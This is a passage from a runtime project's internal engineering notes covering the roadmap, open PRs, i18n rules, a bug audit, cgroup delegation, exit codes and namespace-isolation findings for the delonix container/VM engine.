  here (see "Golden rule" below).
- **`delonix-oci`** (pull/registry/CNB/signature verification) is already the Image Service.
- Cloud-init already exists for the golden VM (section "Golden VM image" above) — it is not greenfield.
- **Does not exist today**: unified `Workload` model, a formal plugin system for drivers, a multi-node
  scheduler, event bus, `delonixd`. Of these, only the first two belong to this repo — see below.

### Boundary with the Portal/Control Plane (applies the "Golden rule" to this request)

The original text designs Portal, IAM, billing, quotas, multi-cluster Proxmox inventory and
a multi-tenant scheduler on top of the runtime. **None of that belongs to this repo** — it is
`delonix-paas`/Control Plane, by the same rule that already forbids the notion of tenant/billing here. A
*multi-cluster* Proxmox driver (inventory, tenant↔resource mapping, cross-cluster scheduler)
is `delonix-paas` work, in the same way the CRI serves the `kubelet` without knowing who the kubelet is.
What may make sense *here* is, at most, a low-level `ProxmoxBackend: VmBackend` (one node,
no notion of tenant) — not the "Proxmox Driver" with inventory/scheduler of the original text.

### Phased roadmap

1. **Phase 1 — Unify the model** (short term, additive): introduce `kind: Workload` as a thin
   layer over the existing `container`/`vm` paths (`spec.type` decides where it dispatches).
   Zero new backend in this phase — only the declarative object and the dispatcher.
2. **Phase 2 — Formalize the plugin system**: extract from `VmBackend` a general trait reusable
   by `delonix-runtime-core`, so that the container engine can also implement it in the
   future. New backends (Firecracker, a single-node `ProxmoxBackend`) enter here, one at a time,
   each with its GO/NO-GO spike (the same pattern already used in this doc for `--privileged`/kind).
3. **Phase 3 — Philosophy decision about a daemon**: `delonixd` only comes onto the table if an event
   bus/continuous observability proves a real need — **it is not a default**, it is a change of
   philosophy (the product is daemonless by design) that needs its own planning session,
   just as already recorded in "Next phases" below.

### Architectural decisions to close before code

- Exact shape of the `kind: Workload`/`apiVersion: runtime.delonix.io/v1` YAML — needs its own design
  doc (field names, versioning) before touching `cmd/`.
- Where the general trait extracted from `VmBackend` lives: `delonix-runtime-core` (shared by
  containers and VMs) is the obvious candidate — confirm it does not create a circular dependency.
- Multi-node scheduler stays **out** of this repo by design (it is a node runtime, not a fleet
  orchestrator) — do not open an issue here for it; it is `delonix-paas`/orchestrator.
- Event bus: only decide the transport (in-process callback vs. daemon) after Phase 3 above, not
  before — it avoids designing for a daemon that may never be approved.

## State for the next session (2026-09-04)

> The previous version of this section was stuck at **2026-08-10** — almost a month, and the entire
> CLI restructuring cycle (below) happened in that interval without this section ever
> being touched. It even listed as "pending" two ADRs (0008 phase 1, 0009) that were already
> **implemented and documented in other sections of this same file** — the exact
> defect that the previous note (2026-07-27) had already warned against repeating. Rewritten from scratch
> from what was measured TODAY, not from what the old section claimed.

Last published tag: **v2.0.0** (`image list`/`backup list` go back to `ls`). The `Cargo.toml` already
says `2.0.0`. Since that tag, **6 PRs merged into `main` and unpublished**: the CLI
restructuring cycle (`docs/discovery/52_CLI_PLANO_MIGRACAO.md`) — B6 (`image --vm` removed,
PR #214), B5 (`storage`/`sharevolume` merged into `volume`, PR #216), the design of B4
(ADR-0029, PR #217), the code of B4 (`net ingress/egress` writing through the same source accounting
of `NetworkAccessRule`, PR #219), and B7 closed by leaf-by-leaf audit (`vm
status`/`pod ls` cut, `get` gains `--namespace`, PR #221).

**The CLI restructuring (B1–B9) is CLOSED.** B1/B2/B5/B6/B7/B8 merged; B9 rejected
(closed decision, v1.0.0); B4 with the design fully resolved (ADR-0029) and the only real
code already merged (#219 — the other two points of the ADR never needed code). **B3 is
100% coded, but NOT merged** — 6 PRs open, all touching sensitive
infrastructure (private key, packet capture, remote execution over SSH, VM control) and therefore
awaiting manual review from the owner, not from an agent:

- **#206** `vm pause`/`unpause` — suspends the vCPUs of a running VM.
- **#207** `pod port-forward` — host↔pod-netns forwarder, kubectl-style.
- **#208** `net capture` — raw packet capture on a container's SDN interface.
- **#209** `image sign` — ECDSA-P256 signature compatible with cosign.
- **#218** `cluster drain`/`uncordon`/`upgrade` — day-2 of a `mode: ssh` cluster.
- **#220** `vm migrate` — stop-copy-start MVP to another `delonix` host (see note below:
  real live migration stays out, for a measured reason).

**Practical warning for whoever merges #218 and #220**: the two edit the SAME section of
`docs/discovery/52_CLI_PLANO_MIGRACAO.md` (the B3 state table) — the second to merge
gets a trivial conflict in that file, and the right resolution is to keep BOTH updates,
never to choose one.

**Verifiable state at 2026-09-03** (measured in the `ngola-ci` gate, not asserted): `cargo fmt
--check`, `clippy -D warnings` and `cargo deny` clean; **739 tests** in the main suite
(`delonix-runtime-bin`), 0 failures; **235 leaves** in the CLI (`scripts/cli_baseline.tsv`, down from
237 with the B7 cut); i18n with the regression tests (`help_i18n_tests`,
`todo_o_comando_tem_entrada_no_manual`) all green. **Not remediated in this pass**: the
E2E battery (`scripts/e2e.sh`) and the chaos harness — the last known numbers (198/198 and
20/20) are from before this whole cycle and were not run again; do not assume they remain
valid without running them.

**Three new ADRs born FROM THIS question** (the user asked to close what ADR-0029
had deliberately left open, plus one new adjacent capability):

- **Collapse `net ingress`/`net egress` into `NetworkAccessRule` — CLOSED, ADR-0030.**
  Measured leaf by leaf (17 imperatives: only 4 — `allow`/`deny` — were even candidates for
  `NetworkAccessRule`; `policy`/`net`/`host` already collapse into `FirewallPolicy` from before;
  `publish`/`unpublish` are of another grain by design, ADR-0029; `rm`/`clear` have no
  declarative equivalent at all). Verdict: no further cut — the `scripts/e2e.sh` of this
  base uses `net ingress`/`net egress` 8 times and `NetworkAccessRule` zero, and all the rest of the
  engine already keeps both forms (imperative and `kind:`) side by side forever.
- **`vm migrate` — real live migration — NO-GO, ADR-0031.** Measured against the real
  documentation of Cloud Hypervisor and of libvirt/QEMU: CH does not transfer any disk in the migration (only
  memory/state — the official demonstrations themselves boot the destination VM without `--disk`); the
  NBD path of libvirt exists and is mature, but requires `virtproxyd-tcp` listening over the network on
  both hosts — the same kind of privileged exception already accepted for `vm bridge`, not a
  rootless default. A hybrid (sync the disk incrementally and only then migrate the
  memory) does not close without a dirty-bitmap API that CH does not expose. It stays blocked on ONE of
  two preconditions that this engine does not have today: shared VM-image storage, or a
  privileged exception accepted for the libvirt daemon — neither of them yet named as a
  concrete need.
- **Kind `Service` — DESIGNED, ADR-0032, not yet implemented.** Selects a SET of
  containers by `matchLabels` (the same primitive that ADR-0024 already designed for
  `FirewallPolicy` and never got around to building) and publishes it as SEVERAL `A` DNS records under
  `<name>.<namespace>.delonix.internal` — round-robin by rotation in the response, no VIP, no
  new dataplane, no daemon: it reuses the `build_dns_index`/TTL that name resolution already
  has. A VIP with real DNAT (`ClusterIP` k8s-style) is deliberately out of v1 — no
  concrete named consumer to justify a new verdict map.

**Pending from previous sessions, NOT re-verified in this pass** (inherited from 2026-08-10;
treat as outdated until confirmed, not as fact — two of the three ADRs that this
section listed as "pending" on that date **were already implemented** when this rewrite
went to confirm them, see the sections "The VM backend registry, and the Proxmox backend (ADR-0008,
closed 2026-08-11)" and "Provisioning storage on a NAS (ADR-0009)" above in this file —
so the list below is flagged as needing new verification, not repeated as
if it were still true):

1. Anonymous volumes of `compose` — design decision to be made (deterministic naming vs.
   own registry).
2. 5 items of namespace/privilege/protocol (physical macvlan/ipvlan, PID in pods, recovery
   of a VM on a respawn of the holder, WebSocket/upgrade in the L7 proxy, exec/attach+`--restart` in the docker
   API) — real state to be confirmed, do not assume they remain undone.
3. CI workflow to rebuild the appliance images.
4. Record the script's videos (`docs/ROTEIRO-VIDEOS.md`) — user's work.

**Half-isolation is worse than none (real incident, 2026-08-12).** Running a battery with
`DELONIX_ROOT` isolated and **without** `DELONIX_NET_RUNTIME_DIR` puts two roots fighting over
`/tmp/delonix-net-<uid>/{control,slirp}.sock` — the sockets are per USER and the pidfiles
per ROOT. The engine has a guard that refuses this ("another delonix state root on this user
already owns the network infra"), and it **stops firing** as soon as the isolated root gains
its own ingress state: from there it brings up a pin/slirp of ITS OWN over the same paths.
The next `net netns up`, run from the REAL root, found the control broken, **rebuilt the
whole infra** (new pin/control/slirp) and **restarted a production container** — the
restart-recovery of v0.41.0 working as designed, over a problem that I
created myself. The other three containers kept their PID and the published ports kept
responding. `scripts/e2e.sh` now REFUSES to run the cloud-hypervisor section
in that configuration, and the header says why. **There is also a finding left to investigate**: the
guard is circumventable — it should look at who is ALIVE on the shared socket, not only at the
presence of a pidfile in the current root.

**A method lesson that this series repeated three times, and is worth more than any of the items above:**
a check is only worth what its filter lets through. A `grep "^  delonix"` over the output of
a test cut off the following lines of a multi-paragraph block; a threshold of "more than 25
characters" hid `container ps` from me; and silencing the `stderr` of a generator let it fail
midway with the site written halfway. When a measurement looks too good, **turn off the filter and
count again**.

## Next phases (requested, not implemented — each one needs its own planning session)

- **`delonix cluster --name <n> --control-plane <n> --workers <n>`** (without `kubeadm`) — local k8s
  cluster via `kind` (shell-out to the tool already installed on the host). **Blocked** by the NO-GO of
  the spike above — `kindest/node` does not boot under our `--privileged` today; see section "Cluster
  Kind mode without Docker — investigation". It needs boot instrumentation before continuing.
- **DONE (v0.24.0)**: `etcd: external` in `delonix cluster apply` + `--etcd-cluster <N>` in
  `delonix cluster kubeadm` — see the "Cluster kubeadm" section above for the full detail
  (own PKI via `rcgen`, parallel bootstrap, kubeadm `--config` YAML).
- **DONE (v0.23.0)**: parallelize host preparation in `cluster apply` (it was sequential in this
  v1) — see the "Cluster kubeadm" section above.
- **`delonixd`** (optional userspace daemon) + **own ingress/egress dataplane** (avoid
  one veth per container — today `infra::do_attach` always creates 1 veth-pair per container,
  confirmed) + **dynamic firewall** for port publishing + **eBPF** for observability +
  **auto-scaling** at peak. None of this exists today (zero eBPF/autoscaling/daemon
  in the repo, confirmed by grep). It is a change of philosophy (the product is daemonless by design)
  and a new dataplane from scratch — months of work for a dedicated crate, not one session.
- **macOS/Windows support (ADR-0036, Proposed)** — deliberately decided as a VM LAUNCHER
  (`delonix machine`), not a port: no engine primitive (namespaces, cgroups v2, nftables,
  `pivot_root`) exists outside the Linux kernel, so porting would be a SECOND engine, not a `#[cfg]`.
  The guest is the same `delonix-vm-base` image already published, zero change on the Linux side. The two
  platforms are NOT equally hard: **Windows** runs over the WSL2 already installed (shell-out to
  `wsl.exe`, no new hypervisor); **macOS** needs a real binding to the Virtualization.framework
  — blocked until there is a real Mac for the GO/NO-GO spike, the same discipline as the Proxmox backend
  (ADR-0008). Zero hypervisor code in this session — this sandbox is Linux and does not compile either of the
  two sides.

## i18n (EN source + embedded pt.po catalog) — `cmd/po.rs`

Since v0.5.0, **the source of user strings is 100% EN** and the translations live
in an embedded gettext catalog (`bins/delonix-runtime-bin/data/pt.po`, 171 msgids),
activated by `--l18n=pt`/`DELONIX_L18N=pt`. Rules so as not to regress:

- **New UI string = EN in the code + entry in `pt.po`.** Never go back to the inline
  `tr(en, pt)` pairs (they died in phase 3a) nor to manual `if is_pt()`.
- `po::t(&'static str)` for fixed strings; `po::tf(template, &[(name, value)])` for
  interpolated ones — `format!` requires literals, so the TEMPLATE is translated with
  NAMED placeholders (`{port}`) and substituted afterwards (named on purpose:
  a translation may reorder them).
- **The clap help is translated at runtime**: the language is decided with `po::peek_lang()`
  BEFORE the parse (the help is generated during it), and `po::translate_help` rewrites
  the about/help of the whole `Command`. Known pitfall: the derive REMOVES the final
  period of the short help — `t_help` compensates (lookup with and without `.`).
- Own `.po` parser (~50 lines, tested) — no `gettext` crate (supply-chain
  rule). `parse_po` covers multi-line msgid/msgstr + escapes.
- **Code comments: 100% EN (DONE).** All comments (`//`, `///`,
  `//!`) of the 9 engine crates (PR #26) and of `delonix-runtime-bin` (PR #27) were
  translated PT→EN; the CLI help that still lived in PT in the code (doc-comments
  `///` of the clap enums + `#[arg]` fields) moved to EN in the source, with the PT in
  `pt.po` (+183 entries in phase 2). Rule to keep: new comment/help = EN in the
  code; the translation goes to `pt.po` (the `t()`/`translate_help` degrade to EN
  if the entry is missing, they never leave the UI mute). Only identifiers/test names
  in PT survive (they are not user text).
- **DONE (v0.23.0)**: error messages of the ENGINE crates (they cannot depend on the
  bin) are translated in the error printer of `main.rs`, by lookup of the EN text —
  `po::t_dyn`. Two bugs closed: (1) `t_dyn` did an EXACT lookup against the
  FULLY rendered text of the error, but that text is always a fixed EN prefix
  (`"invalid argument: "`, `"no such container: "`, ...) glued to the real message —
  it never matched anything, even when there was a `pt.po` entry for the internal message;
  fixed by recognizing the 6 translatable `#[error(...)]` molds of
  `delonix_runtime_core::Error` (`Io`/`Json`/`Runtime` are left out — their text comes
  from an OS errno/serde, it is not ours to translate) and translating prefix/
  interior/suffix separately. (2) the MAIN error path of `main.rs`
  (`run()` → `cmd::output::error`) never even called `t_dyn` — only the 4
  hidden re-execs did; and `for_each_id` (`stop`/`rm`/... with multiple ids)
  had its own `eprintln!` that also never went through it.
- **DONE (v0.47.0): the coverage is now MEASURED, and there is a test.** This section claimed that the
  clap help is translated at runtime — and it is; what had never been measured was how much of the
  catalog existed. Measured: **103 of 232 subcommands** printed the help in EN under `--l18n=pt`
  (the whole `container` group, 28), and **206 flag descriptions**. Both closed, to zero.
  Two tests in `main.rs` (`help_i18n_tests`) walk the `clap::Command` tree:
  `todo_o_help_de_comando_tem_traducao_pt` is **strict**, and
  `o_help_dos_argumentos_so_pode_encolher` is a **ratchet** — it fails if the number goes up (new flag
  without an entry) AND if it goes down (one is translated and the constant is lowered in the same commit); a `<=` would leave
  the debt reading as green. They consult the CATALOG (`po::has_pt_translation`, `#[cfg(test)]`) and
  not `t_help`: in EN `t_help` returns the text itself and the test would pass for the wrong reason.
  **The exception is declared in the code** (`is_same_in_both`) — `Containers: run/ps/stop/...` reads
  the same in both languages, and asking for a translation for that is how a catalog gains noise.
  **Pitfall that cost two passes**: `-h` shows the short `about` and `--help` the
  WHOLE `long_about`/`long_help` — 8 `long_about` and one multi-paragraph `long_help` only
  appeared later, and a `grep "^  delonix"` over the test output cut off their following
  lines. When generating multi-line entries, **do not add `\n` on the last line**: the lookup
  stops matching and the symptom is the test passing (the key exists) with `--help` still in EN.

## Systematic audit of the 208 subcommands (v0.37.0) — 4 data-loss paths

Request: for each command of `--help`, verify whether it does what it promises with all the
parameters, and identify bugs, gaps, security problems and silent crashes that
might compromise production or lose volume/storage data. Surface mapped by
recursive dump of `-h` (208 subcommands), tested **live on a real host** — not just
read. 23 findings, all reproduced before being fixed. Full notes in
[docs/releases/archive/v0.md](docs/releases/archive/v0.md) (section v0.37.0).

**The cross-cutting lesson, worth more than the bugs**: the dominant class was not
"missing command" nor "wrong command" — it was **dishonest reporting**. Three forms, all
invisible to a `cargo test`:

1. **Destroy data and report failure.** `volumes rm` on subuid data deleted the
   `meta.json` before taking EACCES on `_data` → the volume disappeared from `ls`/`df` and
   the bytes remained; a `create` of the same name handed them to the next tenant. `vm rm`
   deleted the qcow2 **before** verifying whether the VM existed, and then returned
   `no such VM`. Rule that stays: **destroy nothing before knowing the object is
   ours to destroy, and delete the accounting LAST.**
2. **Report destruction without destroying.** `sharevolume rm --purge-data` printed
   "data deleted" when `remove_dir_all` failed with EACCES on subuid data.
3. **Report success over failure.** `container run` returned 0 for `exit 42`, for a
   failed `execve` and for a container that never booted (rootfs impossible to
   prepare, 126). A failed backup or migration passed as good.

**Concrete pitfalls to retain for whoever touches here next:**

- **`fs::remove_dir_all` is not atomic**: it deletes entries as it traverses, so
  an EACCES midway leaves the directory PARTIALLY deleted. Never use it over a
  tree that contains metadata whose absence changes the meaning of the object.
- **`as u64` over `f64` is SATURATING in Rust**: `parse_size_bytes("99999999999t")` gave
  `u64::MAX` — a quota that `inspect` shows as set and that is, in fact, no quota
  at all. Any size conversion coming from input needs an overflow guard.
- **A `read_dir` that fails and returns 0 is indistinguishable from an empty directory** — and in
  rootless it is the NORMAL case, not an edge (every managed database does
  `chmod 700` under a mapped userns). Hence `Usage { bytes, unreadable }` and
  `QuotaState { …, measured }`: incomplete measurement is *unknown*, never zero. The new
  re-exec `__duusage` measures from inside the userns, the same idiom as `__volsnap`/`__buildtar`.
- **`remove_tree_mapped` re-executes `current_exe()`** — correct in the real binary, but in a
  **test binary** it re-enters the harness, which reads `__rmtree <path>` as name filters,
  runs zero tests and exits **0**. That false success suppresses any fallback. Where
  it matters, try the simple removal FIRST (faster, no fork) and the mapped one only as a
  last resort.
- **A test can encode the bug.** `default_project_name_normaliza_o_directorio`
  asserted `default_project_name("compose.yml") == "default"` — exactly the
  behavior that collapsed all compose projects into one and made a `down -v`
  delete another project's volume. The test only passed ABSOLUTE paths; the
  real invocation is always relative. When writing a test of a path function,
  cover the form the production code actually passes it.
- **The encrypted vault is worth nothing if the consumer persists the plaintext.** `--secret`
  wrote the decrypted values in `containers/<id>.json` and `container inspect`
  printed them — whereas `secret inspect` redacts them behind `--reveal`. The values
  are now resolved at spawn from the persisted NAMES (as
  `--secret-files` already did, which is why that mode never had the bug); welcome
  side effect: a rotated secret applies on the next `start`.
- **`let _ =` over entropy is fail-open.** `random_token` of the CRI streaming started from
  `[0u8; 16]` and discarded the error of `read_exact` — without `/dev/urandom`, the token was the
  constant of zeros, and these URLs give code execution inside a pod.

**Design decision recorded (A7).** The exit code of a `-d` container **without**
`--restart` is still not capturable: the engine is not the real parent of the process. The
option chosen was to *stop lying* instead of adding a supervisor process per
container (podman's conmon model): `ps -a` shows `Exited (unknown)` instead of
`Dead`, and `wait` refuses to return the fabricated 137, saying how to obtain the real one. With a
supervisor (`--restart on-failure`/`always`/`unless-stopped`) the real code is still
captured. Closing this by default stays as a philosophy decision, not a bug fix.

**To do, deliberately**: `--format json` in the listing commands (automation
has to parse aligned tables) — new API surface in ~10 commands, deserves its own
design.

## Resource limits require a delegated cgroup (measured on a clean VM, 2026-08-04)

**`-m`/`--cpus`/`--pids-limit` are inert in a normal SSH session.** Discovered
running the chaos harness INSIDE a VM created with `delonix vm create` itself —
a clean host reached over SSH, which is how one reaches a real server. On the
development host it went unnoticed because the shell runs under the VS Code scope,
which IS inside `user@<uid>.service`.

Measured, with `-m 128M --cpus 0.5`:

```
cgroup: /user.slice/user-1000.slice/session-40.scope   (partilhado com sshd)
memory.max=max  cpu.max=max  pids.max=max  memory.swap.max=max
```

**It is a cgroup v2 rule, not a bug.** An SSH session scope is a SIBLING of
`user@<uid>.service`, not a child; migrating a pid between the two requires writing the
`cgroup.procs` of the common ancestor (`user-<uid>.slice`), which is root's:

```
mkdir  user@1000.service/probe                  → ok
echo $$ > user@1000.service/probe/cgroup.procs  → EACCES
```

Deriving the uid boundary instead of looking for it in the path **was tried and measured to
not work** — the old comment of `user_service_base` claimed that the migration
was allowed, and it is not. The fallback was deleted instead of leaving code that only creates a
directory where nothing enters.

**What works** (validated, the five limits applied + aggregate ceiling):

```
systemd-run --user --scope -p Delegate=yes -- delonix container run ...
```

`install.sh` now TESTS the delegation for real (creates a child cgroup and tries
to activate `+memory`; reading `cgroup.controllers` is not enough — the controller may be
listed and the migration still forbidden) and prints the remedy when it is missing. The harness
distinguishes the two cases: `aggregate-ceiling` recognizes a `session-*.scope` and SKIPs
with the remedy; `delegated-scope` VERIFIES that under a delegated scope everything applies.

**`install.sh` pitfall caught at the same time**: `GPU_INFO=$(lspci | grep -Ei
'vga|3d controller' | ...)` under `set -euo pipefail` — a `grep` with no match
exits 1, `pipefail` propagates, the assignment fails and the installer DIED silently right
after "preparing the host". It happened on every host without a VGA device: any
headless server and practically every VM. A cosmetic GPU label can never
be allowed to fail an installation.
## Classed exit codes (v0.49.0) — «does not exist» stopped being «it blew up»

Measured before writing any code: `container inspect <nonexistent>` → **1**,
`volumes rm <nonexistent>` → **1**, a generic error → **1**. Only `clap` stood
apart (2). So the two answers that a reconciler most needs to tell apart —
«create it, because it's missing» and «stop, because it failed» — were the same
number, and the only remaining signal was the MESSAGE. Which is **translated**: a
script with `grep 'no such'` works on the machine where it was written and stops
classifying on a node running `--l18n=pt`. Parsing the message was worse than not
having the information at all.

- **A single place decides** — `cmd/exitcode.rs::for_error`, pure, driven by the
  error's TYPE. The `match` is **exhaustive on purpose**: a new variant of
  `delonix_runtime_core::Error` halts compilation right here and forces a
  decision, which is the opposite of what a `_ =>` does (file it under «generic»
  without warning anyone).
- **`3` and `4` are not invented** — they are the LSB codes that `systemctl`
  still speaks (3 = not running, 4 = no such unit); `5` (conflict) is the next
  free number. Nothing collides with clap's `2` (which is ALSO the «there are
  changes» of `stack plan --detailed-exitcode`), nor with the shell's
  126/127/128+N — there is a test demanding it.
- **`run`/`exec` still return the WORKLOAD's code**, and that is the easiest
  regression to introduce here: those paths exit via
  `propagate_exit_status`/`process::exit` and never pass through this module.
  Confirmed live with a real container, including `exit 4` and `exit 5` — a
  workload that picks a number that is also an engine class keeps it.
- **`for_each_id` has its OWN exit path** (it exits before `main` sees the
  error): without the same map in there, `rm a b` answered 1 where `rm a` says 4.
  A batch all of the same class keeps it; a MIXED batch falls into the generic —
  picking the class of the first would make the result depend on the order in
  which the ids were written.

**Two mislabelled errors, found while wiring this up** — and without fixing them
the feature was decorative:

1. **`util::find` said `Invalid` for «does not exist»**, and it is the resolver
   for ALL the container verbs (`inspect`/`stop`/`rm`/`logs`/`exec`/`port`/`wait`...).
   That is: the engine's most-used resource was the only one that did NOT
   classify, while `volumes`/`network`/`secret`/`vm` already answered `NotFound`.
   It also said the same thing in different words than `Store::load` («container
   not found: x» vs. «no such container: x»); it now uses the store's wording.
   The AMBIGUOUS case (a prefix matching three) stays `Invalid` — there the
   caller's next step is to fix the argument, not create the resource.
2. **`Error::Conflict` had ZERO producers.** `delonix-mgmt` matched on it (409)
   and nobody constructed it; the real «already exists» rejections said `Invalid`
   and exited 400/1. Publishing a code for a variant that nothing constructs would
   be **a number that can never come back** — the same decoration as the
   digest-pinning that audit #3 caught. The rejections were moved to where they
   belonged (the three `create*` of `NetworkStore`, the `volumes snapshot
   create`), which along the way fixes the HTTP to 409.

**What was left out, and why**: «host precondition unmet» (a session without
cgroup delegation) **is not an error** — the engine warns and carries on, so
there is nothing to classify, and giving it a number would be inventing the
condition first. `Invalid`/`Registry` stay at 1: neither changes what the
reconciler does next, and each new number is a promise for the rest of `0.x`.
`workload describe` of a nonexistent name stays at 1 (uses `Invalid`), and that
is **declared** in `cli-stability.md` — the `workload` group is on the list of
those not yet stable.

**Only the E2E battery proves the wiring.** A unit test of the map passes all the
same with `main` ignoring it, which is why `scripts/e2e.sh` gained a NUMERIC
expectation form (`check <name> 4 …`) alongside `ok`/`fail` — a `fail` would stay
green if every class collapsed back into 1.

## Namespace isolation is INERT without `br_netfilter` (measured 2026-08-12)

Found while running the chaos harness and the E2E battery **inside a disposable VM** — which is the
only way to run them, because GitHub's hosted runners block unprivileged userns and the Chaos job
goes **green by skipping everything** (`skipped: Corre o arnês de caos`, `skipped: Bateria
E2E da CLI`). A green-by-no-execution is indistinguishable from a green-by-success if you only
look at the top.

**The measurement**: in a VM made from OUR `delonix-vm-base:ubuntu-24.04`, the two isolation
scenarios FAIL — `teamA alcança teamB`. Load `br_netfilter` and set the two
`bridge-nf-call-*` to 1, and those same two PASS, with nothing else changed. The development host
passes because `install.sh` applies them by default (`WITH_TUNE=1`).

**Why**: isolation lives in nftables chains on the `forward` hook; traffic between two
containers on the SAME bridge only reaches there if `br_netfilter` carries it up to the IP layer.
Without the module the chains are installed, the sets `@dlxall`/`@dlxns_*` are populated, **every
command reports success** — and the boundary does not exist. It is the most expensive form of
silent failure this engine can have, because the thing that fails is a security property that reads
as applied. `infra.rs:333` already acknowledged the dependency **in a comment**; nothing verified
it.

**Fixed where it is unambiguously ours**: the `rootless_customization_steps` recipe now
writes `/etc/modules-load.d/delonix.conf` and `/etc/sysctl.d/99-delonix-bridge.conf` (files, and
not `modprobe`/`sysctl -w`: `virt-customize` runs against an offline guest). `install.sh`
already did it, but justified it by **Kubernetes** — so an image for rootless-only had no
reason to inherit it, and did not. Test demanding both sysctls on all four distros.

**Decided on 2026-10-02 (D5 of the maturity plan): refuse.** A named `--namespace`
on a host that does not filter bridge traffic is refused with DX-6305 (exit 69)
before the workload runs: container, pod and VM. The attach is undone, so no
lease and no record are left. `DELONIX_ALLOW_UNENFORCED_ISOLATION=1` keeps the old behaviour
(loud warning and the workload runs). «Couldn't ask» (holder down or old)
remains silent. The battery's gate sets the sysctl to 0 only inside the ISOLATED holder of the
run, with a container holding it: a refusal that leaves the holder empty tears it down, and the
next one is born with the default value (1) — that is how the valve's check passed for the
wrong reason in the first measurement.

## The «X is not Y» class — sweep of 2026-08-05

User's request on seeing that five bugs in a series were the same sentence. It is worth more as a
checklist for whoever touches here than as a list of fixes:

- **code in Portuguese** is not an architecture decision — it is the name of the tests (2026-08-21:
  of the 1165 PT function names across the two Rust repos, **1145, or 98.3%, are test names**;
  only 2 are public, and of the 1690 public items ZERO have PT in `serde(rename)`, `pub` fields or
  CLI flags). The convention has been EN-at-source with a PT catalog since v0.32.2 — what stayed
  in Portuguese stayed by having SKIPPED the catalog. See «Code language (LANG-01)»;
- a **counter with false positives** is not a counter — it is noise with a number in front. The
  `lang_ratchet` lexicon carried `nas`, which collides with **NAS**: six already-English comments
  counted as debt. Before trusting a debt metric, read a sample of what it
  accuses;
- a **socket file** is not a listener (`wait_for_control_sock` was `.exists()`);
- **`/sys/class/net`** is not the process's netns (it reports the one of whoever MOUNTED the sysfs);
- **`capture()` returning `Ok`** is not the command having passed (it does not look at the exit
  status — you always read the OUTPUT, never the `Result`);
- a **label** is not the persisted state (`Container.pod` existed and was never assigned);
- **`None` in the control pid** is not the absence of control (a pre-split holder does both
  jobs in a single process);
- **`holder_pid.is_some()`** is not «the holder is reachable» (v0.34.2);
- **`container.userns`** is not «it is in a userns different from mine»;
- an **unreadable directory** is not an empty directory — `ls`/`du` over a `chmod 700` `_data`
  of a mapped subuid return zero, and in rootless that is the NORMAL case (2026-08-09: I reported
  five Postgres volumes as lost based on this; read from INSIDE the userns they were all
  there, one of them with 128 GiB). The engine already has the right answer — `volumes
  inspect`/`__duusage` measure from inside and distinguish *unknown* from *zero*; it is the
  read from outside that lies;
- the **`ENOENT` of a `Command::status()`** is not a missing file — it is the TOOL not
  existing, and the phrase «No such file or directory» sends the reader hunting for a path
  (`vmimage::tool_package`, v0.45.0);
- **sweeping two sources is not sweeping the whole list**, and a partial derivation reads exactly
  like a complete one. `complete::namespaces` gathered from containers and VMs; the `cmd::kinds`
  table says SEVEN Kinds carry a namespace. Four came by transitivity and nobody had written it
  down (a pod is its members, a `Workload`/`Stack` stamps its children) — but `Volume` did not: a
  tenant whose only resource was a share volume **did not exist** for TAB, because nothing of it
  is running. Measured side by side on the same root: the previous binary offered `default` and
  nothing else, with two namespaces on disk. The fix that matters is not the missing source — it is
  the **`NAMESPACE_SOURCES` table, which now GOVERNS the derivation** and forces each namespaced
  Kind to declare itself `Store` (this module reads its registry) or `Via` (the namespace travels,
  and to where). A classifier nobody consults would be the seventh list this repo has already paid
  for once;
- **fixing the EXECUTION enum is not fixing the CLI.** The three VM-image paths
  converge on the `VmImageCmd` of `cmd/vmimage.rs`, but the `clap` DECLARATION of each lives
  where the user reaches it: I put the completer on `VmImageCmd::Rm` and
  `delonix image vm rm <TAB>` still offered zero, because what it parses is
  `image.rs::VmSub::Rm` — a second declaration of the same command, sixteen lines above
  a `VmSub::Describe` that already completed. **The proof is not the code compiling, it is probing
  the three entry points** (`COMPLETE=bash <bin> -- delonix image vm rm ''`), which is
  step 4 of `delonix-feature-dev` and here gave 0 / 18 / 37 before and 18 / 18 / 37 after.
  The third is `image --vm rm`, which **always refuses** (`rc=1`, naming the alternative)
  and whose 37 candidates are container images — cosmetic noise that clap's mechanism
  cannot avoid, because an `ArgValueCandidates` does not see the `--vm` flag;
- **`/sys/fs/cgroup/cgroup.subtree_control` containing `memory`** is not «MY session has
  delegation» — it is the host's ROOT cgroup, and it contains it always (v0.42.2, see
  below);
- **an EXPECTED lease is not a LIVE VM** — in cloud-hypervisor the IP is not observed, it is
  computed from the MAC (`infra::dhcp_lease_ip`, deliberate and correct: it is what puts the address
  under namespace isolation BEFORE the guest boots). The side effect was that `vm create
  --wait` had nothing to wait for: it returned in **0.062 s** announcing `is up` over a VM whose
  firmware fails before the kernel, with `--boot-timeout` having nothing to spend itself on (measured
  2026-08-12, v0.50.0). See the «The `--wait` of a CH VM» section below;
- **an already-extracted rootfs is not a rootfs being extracted** — the 2nd pass of the
  `--net <custom-net>` re-exec re-extracted the WHOLE image to the path that the 1st had just filled.
  Measured with `pgvector:pg16` (10,296 entries, 431 MB): 1,526 ms with `--net none` versus
  3,143 ms with a custom net, and the delta is exactly one extraction (1,666 ms apart); `strace`
  agrees, 2,060 canonicalizations of the target versus 1,030. Re-extracting over a filled
  tree costs full price — there is no accidental saving. The fix was **rootless-only on
  purpose**: as root `prepare_rootfs` MOUNTS an overlay, and a mount from the 1st pass is not
  necessarily visible in the namespace where the re-exec lands (v0.47.0). **Since v0.59.0
  rootless also does not extract per container** — it shares the layers and the mount is done by the
  init of EACH pass, inside the namespace where it lands, so the root/rootless asymmetry of this
  paragraph ceased to exist;
- **two builds with the same version are not the same build** — `Cargo.toml` still said
  `0.58.0` after the v0.58.0 tag had gone out, so a binary installed BEFORE the series and the
  build that contained it both presented themselves as `delonix 0.58.0`. It cost a real
  confusion: the host created flat containers and `--version` swore it was up to date. **What
  discriminates is the behaviour, not the number** — here, whether a new container is born with
  `overlay-lowers` or with `rootfs/`. Closed with the bump to 0.59.0, but the rule stands:
  after a tag, the working version has to leave the published number immediately;
- **`Command::spawn` does not return before the `exec`** — it reads a CLOEXEC pipe that only closes
  there, so it can report exec failures. Hence a `pre_exec` that BLOCKS (waiting for userns maps
  that the parent only writes after `spawn` returns) deadlocks: the two wait for each other.
  Measured — a `container cp` of a stopped container hung until killed. It is the reason
  `reexec_mapped` uses a raw `fork`, and `reexec_mapped_hold` had to do the same (v0.59.0);
